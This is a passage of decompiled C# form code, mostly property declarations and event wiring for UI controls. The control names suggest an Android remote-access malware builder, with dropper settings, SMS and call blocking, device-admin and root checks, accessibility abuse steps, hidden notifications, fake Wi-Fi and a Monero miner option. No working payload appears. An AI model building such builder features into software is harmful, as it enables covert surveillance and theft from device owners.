	[field: AccessedThroughProperty("hidaccsstitle")]
	internal virtual DrakeUISymbolLabel hidaccsstitle
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon btnstyleM
	{
		[CompilerGenerated]
		get
		{
			return _btnstyleM;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = btnstyleM_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _btnstyleM;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_btnstyleM = value;
			drakeUIButtonIcon = _btnstyleM;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon btnstyleD
	{
		[CompilerGenerated]
		get
		{
			return _btnstyleD;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon8_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _btnstyleD;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_btnstyleD = value;
			drakeUIButtonIcon = _btnstyleD;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon nextbtn
	{
		[CompilerGenerated]
		get
		{
			return _nextbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = nextbtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _nextbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_nextbtn = value;
			drakeUIButtonIcon = _nextbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon backbtn
	{
		[CompilerGenerated]
		get
		{
			return _backbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = backbtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _backbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_backbtn = value;
			drakeUIButtonIcon = _backbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon addicon
	{
		[CompilerGenerated]
		get
		{
			return _addicon;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = addicon_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _addicon;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_addicon = value;
			drakeUIButtonIcon = _addicon;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon randids
	{
		[CompilerGenerated]
		get
		{
			return _randids;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = randids_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _randids;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_randids = value;
			drakeUIButtonIcon = _randids;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon randver
	{
		[CompilerGenerated]
		get
		{
			return _randver;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = randver_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _randver;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_randver = value;
			drakeUIButtonIcon = _randver;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("DrakeWidth_W11")]
	internal virtual DrakeWidth_W DrakeWidth_W11
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("plugpanel")]
	internal virtual Panel plugpanel
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label7")]
	internal virtual Label Label7
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIOSSwitch checkplugin
	{
		[CompilerGenerated]
		get
		{
			return _checkplugin;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DrakeUIOSSwitch.OnValueChanged value2 = checkplugin_ValueChanged;
			DrakeUIOSSwitch drakeUIOSSwitch = _checkplugin;
			if (drakeUIOSSwitch != null)
			{
				drakeUIOSSwitch.ValueChanged -= value2;
			}
			_checkplugin = value;
			drakeUIOSSwitch = _checkplugin;
			if (drakeUIOSSwitch != null)
			{
				drakeUIOSSwitch.ValueChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel21")]
	internal virtual Panel Panel21
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("plugstate")]
	internal virtual DrakeUISymbolLabel plugstate
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TabPage6")]
	internal virtual TabPage TabPage6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("droppanel")]
	internal virtual Panel droppanel
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel25")]
	internal virtual Panel Panel25
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("dropnamelable")]
	internal virtual DrakeUISymbolLabel dropnamelable
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("dropname")]
	internal virtual DrakeUITextBox dropname
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label8")]
	internal virtual Label Label8
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel26")]
	internal virtual Panel Panel26
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("dropidlabel")]
	internal virtual DrakeUISymbolLabel dropidlabel
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("dropid")]
	internal virtual DrakeUITextBox dropid
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon8
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = rand_dropid;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon8;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon8 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon8;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel27")]
	internal virtual Panel Panel27
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("dropverlabel")]
	internal virtual DrakeUISymbolLabel dropverlabel
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("dropver")]
	internal virtual DrakeUITextBox dropver
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon9
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon9;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = rand_dropver;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon9;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon9 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon9;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual ListView Droplisticons
	{
		[CompilerGenerated]
		get
		{
			return _Droplisticons;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Droplisticons_SelectedIndexChanged;
			ListView listView = _Droplisticons;
			if (listView != null)
			{
				listView.SelectedIndexChanged -= value2;
			}
			_Droplisticons = value;
			listView = _Droplisticons;
			if (listView != null)
			{
				listView.SelectedIndexChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("ColumnHeader1")]
	internal virtual ColumnHeader ColumnHeader1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel28")]
	internal virtual Panel Panel28
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("dropiconlabel")]
	internal virtual DrakeUISymbolLabel dropiconlabel
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("dropimg")]
	internal virtual PictureBox dropimg
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W20")]
	internal virtual DrakeWidth_W DrakeWidth_W20
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon10
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon10;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon10_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon10;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon10 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon10;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("comboTargts")]
	internal virtual DrakeUIComboBox comboTargts
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("blockcalls")]
	internal virtual DrakeUICheckBox blockcalls
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("blocksms")]
	internal virtual DrakeUICheckBox blocksms
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel23")]
	internal virtual Panel Panel23
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel29")]
	internal virtual Panel Panel29
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeUISymbolLabel2")]
	internal virtual DrakeUISymbolLabel DrakeUISymbolLabel2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIComboBox combodroptype
	{
		[CompilerGenerated]
		get
		{
			return _combodroptype;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = combodroptype_SelectedValueChanged;
			EventHandler value3 = combodroptype_SelectedIndexChanged;
			DrakeUIComboBox drakeUIComboBox = _combodroptype;
			if (drakeUIComboBox != null)
			{
				drakeUIComboBox.SelectedValueChanged -= value2;
				drakeUIComboBox.SelectedIndexChanged -= value3;
			}
			_combodroptype = value;
			drakeUIComboBox = _combodroptype;
			if (drakeUIComboBox != null)
			{
				drakeUIComboBox.SelectedValueChanged += value2;
				drakeUIComboBox.SelectedIndexChanged += value3;
			}
		}
	}

	[field: AccessedThroughProperty("DrakeWidth_W21")]
	internal virtual DrakeWidth_W DrakeWidth_W21
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("panelmsgdrop")]
	internal virtual Panel panelmsgdrop
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeUISymbolLabel4")]
	internal virtual DrakeUISymbolLabel DrakeUISymbolLabel4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("dropmsg")]
	internal virtual DrakeUITextBox dropmsg
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("paneltitledrop")]
	internal virtual Panel paneltitledrop
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeUISymbolLabel3")]
	internal virtual DrakeUISymbolLabel DrakeUISymbolLabel3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("droptitle")]
	internal virtual DrakeUITextBox droptitle
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUICheckBox encryptmain
	{
		[CompilerGenerated]
		get
		{
			return _encryptmain;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DrakeUICheckBox.OnValueChanged value2 = encryptmain_ValueChanged;
			DrakeUICheckBox drakeUICheckBox = _encryptmain;
			if (drakeUICheckBox != null)
			{
				drakeUICheckBox.ValueChanged -= value2;
			}
			_encryptmain = value;
			drakeUICheckBox = _encryptmain;
			if (drakeUICheckBox != null)
			{
				drakeUICheckBox.ValueChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("DrakeWidth_W22")]
	internal virtual DrakeWidth_W DrakeWidth_W22
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("checkforcbypass")]
	internal virtual DrakeUICheckBox checkforcbypass
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUICheckBox Devadmincheck
	{
		[CompilerGenerated]
		get
		{
			return _Devadmincheck;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DrakeUICheckBox.OnValueChanged value2 = Devadmincheck_ValueChanged;
			DrakeUICheckBox drakeUICheckBox = _Devadmincheck;
			if (drakeUICheckBox != null)
			{
				drakeUICheckBox.ValueChanged -= value2;
			}
			_Devadmincheck = value;
			drakeUICheckBox = _Devadmincheck;
			if (drakeUICheckBox != null)
			{
				drakeUICheckBox.ValueChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("rootcheck")]
	internal virtual DrakeUICheckBox rootcheck
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("checkxmr")]
	internal virtual DrakeUICheckBox checkxmr
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("checkffmpg")]
	internal virtual DrakeUICheckBox checkffmpg
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label9")]
	internal virtual Label Label9
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("checkdexp")]
	internal virtual DrakeUICheckBox checkdexp
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel30")]
	internal virtual Panel Panel30
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("listshortcuts")]
	internal virtual ListBox listshortcuts
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel31")]
	internal virtual Panel Panel31
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel32")]
	internal virtual Panel Panel32
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("adminpass")]
	internal virtual DrakeUITextBox adminpass
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("admlabelpass")]
	internal virtual Label admlabelpass
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel33")]
	internal virtual Panel Panel33
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label10")]
	internal virtual Label Label10
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUICheckBox checkreplcply
	{
		[CompilerGenerated]
		get
		{
			return _checkreplcply;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DrakeUICheckBox.OnValueChanged value2 = checkreplcply_ValueChanged;
			DrakeUICheckBox drakeUICheckBox = _checkreplcply;
			if (drakeUICheckBox != null)
			{
				drakeUICheckBox.ValueChanged -= value2;
			}
			_checkreplcply = value;
			drakeUICheckBox = _checkreplcply;
			if (drakeUICheckBox != null)
			{
				drakeUICheckBox.ValueChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel34")]
	internal virtual Panel Panel34
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("checkNoservice")]
	internal virtual DrakeUICheckBox checkNoservice
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label11")]
	internal virtual Label Label11
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label12")]
	internal virtual Label Label12
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("checkhidnotify")]
	internal virtual DrakeUICheckBox checkhidnotify
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("checkfakewifi")]
	internal virtual DrakeUICheckBox checkfakewifi
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("panelinneradmin")]
	internal virtual Panel panelinneradmin
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("checkreqadmin")]
	internal virtual DrakeUICheckBox checkreqadmin
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label13")]
	internal virtual Label Label13
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIOSSwitch checkstore
	{
		[CompilerGenerated]
		get
		{
			return _checkstore;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DrakeUIOSSwitch.OnValueChanged value2 = checkremember_ValueChanged;
			DrakeUIOSSwitch drakeUIOSSwitch = _checkstore;
			if (drakeUIOSSwitch != null)
			{
				drakeUIOSSwitch.ValueChanged -= value2;
			}
			_checkstore = value;
			drakeUIOSSwitch = _checkstore;
			if (drakeUIOSSwitch != null)
			{
				drakeUIOSSwitch.ValueChanged += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon11
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon11;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon11_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon11;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon11 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon11;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("appico")]
	internal virtual DataGridViewImageColumn appico
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("numnamclm")]
	internal virtual DataGridViewTextBoxColumn numnamclm
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("numculm")]
	internal virtual DataGridViewTextBoxColumn numculm
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("acctclum")]
	internal virtual DataGridViewTextBoxColumn acctclum
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("appsizclum")]
	internal virtual DataGridViewTextBoxColumn appsizclum
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("verclum")]
	internal virtual DataGridViewTextBoxColumn verclum
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("statclmn")]
	internal virtual DataGridViewTextBoxColumn statclmn
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel35")]
	internal virtual Panel Panel35
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel36")]
	internal virtual Panel Panel36
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("lblaccsspage")]
	internal virtual Label lblaccsspage
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIOSSwitch checkaccsspage
	{
		[CompilerGenerated]
		get
		{
			return _checkaccsspage;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DrakeUIOSSwitch.OnValueChanged value2 = checkaccsspage_ValueChanged;
			DrakeUIOSSwitch drakeUIOSSwitch = _checkaccsspage;
			if (drakeUIOSSwitch != null)
			{
				drakeUIOSSwitch.ValueChanged -= value2;
			}
			_checkaccsspage = value;
			drakeUIOSSwitch = _checkaccsspage;
			if (drakeUIOSSwitch != null)
			{
				drakeUIOSSwitch.ValueChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("pnlsteps")]
	internal virtual Panel pnlsteps
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label14")]
	internal virtual Label Label14
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel37")]
	internal virtual Panel Panel37
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("accssview")]
	internal virtual WebView2 accssview
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel38")]
	internal virtual Panel Panel38
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("stepslist")]
	internal virtual ListBox stepslist
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel39")]
	internal virtual Panel Panel39
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon12
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon12;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon12_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon12;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon12 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon12;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("DrakeWidth_W23")]
	internal virtual DrakeWidth_W DrakeWidth_W23
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon13
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon13;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon13_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon13;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon13 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon13;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("steptxt")]
	internal virtual DrakeUITextBox steptxt
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel40")]
	internal virtual Panel Panel40
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon15
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon15;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon15_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon15;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon15 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon15;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("DrakeWidth_W24")]
	internal virtual DrakeWidth_W DrakeWidth_W24
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon14
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon14;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon14_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon14;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon14 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon14;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("TabPage7")]
	internal virtual TabPage TabPage7
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel48")]
	internal virtual Panel Panel48
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeUISymbolLabel15")]
	internal virtual DrakeUISymbolLabel DrakeUISymbolLabel15
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUITextBox txtC
	{
		[CompilerGenerated]
		get
		{
			return _txtC;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = txtC_TextChanged;
			DrakeUITextBox drakeUITextBox = _txtC;
			if (drakeUITextBox != null)
			{
				drakeUITextBox.TextChanged -= value2;
			}
			_txtC = value;
			drakeUITextBox = _txtC;
			if (drakeUITextBox != null)
			{
				drakeUITextBox.TextChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel47")]
	internal virtual Panel Panel47
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeUISymbolLabel14")]
	internal virtual DrakeUISymbolLabel DrakeUISymbolLabel14
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUITextBox txtS
	{
		[CompilerGenerated]
		get
		{
			return _txtS;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = txtS_TextChanged;
			DrakeUITextBox drakeUITextBox = _txtS;
			if (drakeUITextBox != null)
			{
				drakeUITextBox.TextChanged -= value2;
			}
			_txtS = value;
			drakeUITextBox = _txtS;
			if (drakeUITextBox != null)
			{
				drakeUITextBox.TextChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel46")]
	internal virtual Panel Panel46
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeUISymbolLabel13")]
	internal virtual DrakeUISymbolLabel DrakeUISymbolLabel13
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUITextBox txtL
	{
		[CompilerGenerated]
		get
		{
			return _txtL;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = txtL_TextChanged;
			DrakeUITextBox drakeUITextBox = _txtL;
			if (drakeUITextBox != null)
			{
				drakeUITextBox.TextChanged -= value2;
			}
			_txtL = value;
			drakeUITextBox = _txtL;
			if (drakeUITextBox != null)
			{
				drakeUITextBox.TextChanged += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel45")]
	internal virtual Panel Panel45
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

